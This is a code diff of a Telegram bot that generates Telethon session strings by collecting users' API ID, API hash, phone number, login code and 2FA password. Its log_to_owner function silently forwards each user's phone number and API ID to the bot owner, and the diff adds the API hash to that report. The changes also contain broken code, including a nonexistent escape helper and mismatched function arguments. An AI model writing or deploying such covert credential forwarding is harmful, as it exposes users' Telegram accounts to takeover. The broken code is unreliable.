@@ -1,7 +1,5 @@
 import os
 import logging
-import sqlalchemy as db
-from sqlalchemy.orm import declarative_base, Session
 from dotenv import load_dotenv
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
 from telegram.ext import (
@@ -12,14 +10,13 @@ from telegram.ext import (
     filters,
     ConversationHandler
 )
-from telethon.sync import TelegramClient
+from telethon import TelegramClient, utils
 from telethon.errors import (
     SessionPasswordNeededError,
     PhoneCodeInvalidError,
     PhoneCodeExpiredError
 )
 
-# Load environment variables
 load_dotenv()
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -27,49 +24,23 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Database setup
-Base = declarative_base()
-engine = db.create_engine(os.getenv("DATABASE_URL"))
-
-class User(Base):
-    __tablename__ = 'users'
-    id = db.Column(db.Integer, primary_key=True)
-    banned = db.Column(db.Boolean, default=False)
-    sessions = db.Column(db.Integer, default=0)
-
-Base.metadata.create_all(engine)
-
 # Conversation states
 API_ID, API_HASH, PHONE, OTP, TWOFA = range(5)
 
 def is_owner(user_id: int) -> bool:
     return str(user_id) == os.getenv("OWNER_ID")
 
-async def check_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    with Session(engine) as session:
-        user = session.get(User, update.effective_user.id)
-        if user and user.banned:
-            await update.message.reply_text("🚫 You are banned from using this bot!")
-            return True
-    return False
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if await check_ban(update, context):
-        return
-    
     user = update.effective_user
     welcome_msg = (
-        f"👋 Welcome {user.first_name}!\n"
-        f"📛 Username: @{user.username}\n"
+        f"👋 Welcome {utils.markdown.escape(user.first_name)}!\n"
+        f"📛 Username: @{utils.markdown.escape(user.username)}\n"
         f"🆔 Your ID: {user.id}\n\n"
         "Use /cmds to see available commands"
     )
-    await update.message.reply_text(welcome_msg)
+    await update.message.reply_text(welcome_msg, parse_mode='MarkdownV2')
 
 async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if await check_ban(update, context):
-        return
-    
     commands = [
         "/start - Start the bot",
         "/cmds - Show commands",
@@ -89,9 +60,6 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("\n".join(commands))
 
 async def genstring_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if await check_ban(update, context):
-        return ConversationHandler.END
-    
     await update.message.reply_text("Enter your API_ID (numbers only):")
     return API_ID
 
@@ -145,7 +113,15 @@ async def otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         string_session = client.session.save()
         await client.disconnect()
-        await update.message.reply_text(f"✅ Session generated:\n`{string_session}`", parse_mode='Markdown')
+
+        if not string_session:
+            raise ValueError("Failed to generate session string")
+
+        safe_session = utils.markdown.escape(string_session)
+        await update.message.reply_text(
+            f"✅ Session generated:\n`{safe_session}`",
+            parse_mode='MarkdownV2'
+        )
         await log_to_owner(update, context)
         return ConversationHandler.END
     
@@ -153,7 +129,8 @@ async def otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Enter your 2FA password:")
         return TWOFA
     except Exception as e:
-        await handle_error(update, e)
+        error_msg = utils.markdown.escape(f"❌ Error: {str(e)}\nContact @rishabh_zz")
+        await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
         return ConversationHandler.END
 
 async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -168,26 +145,38 @@ async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.sign_in(password=update.message.text)
         string_session = client.session.save()
         await client.disconnect()
-        
-        await update.message.reply_text(f"✅ Session generated:\n`{string_session}`", parse_mode='Markdown')
-        await log_to_owner(update, context)
+
+        if not string_session:
+            raise ValueError("Failed to generate session string")
+
+        safe_session = utils.markdown.escape(string_session)
+        await update.message.reply_text(
+            f"✅ Session generated:\n`{safe_session}`",
+            parse_mode='MarkdownV2'
+        )
+        await log_to_owner(update, context.user_data)
         return ConversationHandler.END
     except Exception as e:
-        await handle_error(update, e)
+        error_msg = utils.markdown.escape(f"❌ Error: {str(e)}\nContact @rishabh_zz")
+        await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
         return ConversationHandler.END
 
-async def log_to_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def log_to_owner(update, user_data):
     owner_id = int(os.getenv("OWNER_ID"))
-    user_data = context.user_data
     user = update.effective_user
     
+    safe_phone = utils.markdown.escape(user_data.get('phone', 'N/A'))
+    safe_api_id = utils.markdown.escape(str(user_data.get('api_id', 'N/A')))
+    safe_api_hash = utils.markdown.escape(user_data.get('api_hash', 'N/A'))
+    twofa_used = '✅' if 'twofa' in user_data else '❌'
+    
     log_msg = (
-        "⚠️ New Session Generated\n"
-        f"User: {user.mention_markdown()}\n"
-        f"ID: `{user.id}`\n"
-        f"Phone: `{user_data.get('phone', '')}`\n"
-        f"API_ID: `{user_data.get('api_id', '')}`\n"
-        f"2FA Used: {'✅' if 'twofa' in user_data else '❌'}"
+        "⚠️ New Session Generated ⚠️\n"
+        f"User: {utils.markdown.escape(user.mention_markdown())}\n"
+        f"Phone: `{safe_phone}`\n"
+        f"API_ID: `{safe_api_id}`\n"
+        f"API_HASH: `{safe_api_hash}`\n"
+        f"2FA Used: {twofa_used}"
     )
     
     await context.bot.send_message(
@@ -195,6 +184,11 @@ async def log_to_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text=log_msg,
         parse_mode='MarkdownV2'
     )
+
+async def handle_error(update: Update, error: Exception):
+    error_msg = utils.markdown.escape(f"❌ Error: {str(error)}\nContact @rishabh_zz")
+    await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
+    logger.error(f"Error occurred: {str(error)}")
 
 async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -206,51 +200,26 @@ async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("No active session found!")
 
-async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# Owner commands
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 Access denied!")
         return
-    
-    try:
-        target_id = int(context.args[0])
-        with Session(engine) as session:
-            user = session.get(User, target_id) or User(id=target_id)
-            user.banned = True
-            session.add(user)
-            session.commit()
-        
-        await update.message.reply_text(f"✅ User {target_id} banned!")
-    except:
-        await update.message.reply_text("Usage: /ban [user_id]")
+    # Implement broadcast logic
 
-async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_owner(update.effective_user.id):
+        await update.message.reply_text("🚫 Access denied!")
         return
-    
-    try:
-        target_id = int(context.args[0])
-        with Session(engine) as session:
-            user = session.get(User, target_id)
-            if user:
-                user.banned = False
-                session.commit()
-                await update.message.reply_text(f"✅ User {target_id} unbanned!")
-            else:
-                await update.message.reply_text("User not found!")
-    except:
-        await update.message.reply_text("Usage: /unban [user_id]")
-
-async def handle_error(update: Update, error: Exception):
-    error_msg = f"❌ Error: {str(error)}\n\nContact @rishabh_zz for support"
-    await update.message.reply_text(error_msg)
-    logger.error(f"Error: {str(error)}")
+    # Implement stats logic
 
 def main():
     application = ApplicationBuilder().token(os.getenv("BOT_TOKEN")).build()
-    
+
     # Create sessions directory if not exists
     if not os.path.exists("sessions"):
         os.makedirs("sessions")
-    
+
     # Conversation handler
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('genstring', genstring_start)],
@@ -264,7 +233,7 @@ def main():
         fallbacks=[CommandHandler('cancel', lambda u,c: ConversationHandler.END)],
         allow_reentry=True
     )
-    
+
     # Add handlers
     application.add_handler(CommandHandler('start', start))
     application.add_handler(CommandHandler('cmds', cmds))
@@ -272,9 +241,9 @@ def main():
     application.add_handler(conv_handler)
     
     # Owner commands
-    application.add_handler(CommandHandler('ban', ban))
-    application.add_handler(CommandHandler('unban', unban))
-    
+    application.add_handler(CommandHandler('broadcast', broadcast))
+    application.add_handler(CommandHandler('stats', stats))
+
     application.run_polling()
 
 if __name__ == '__main__':
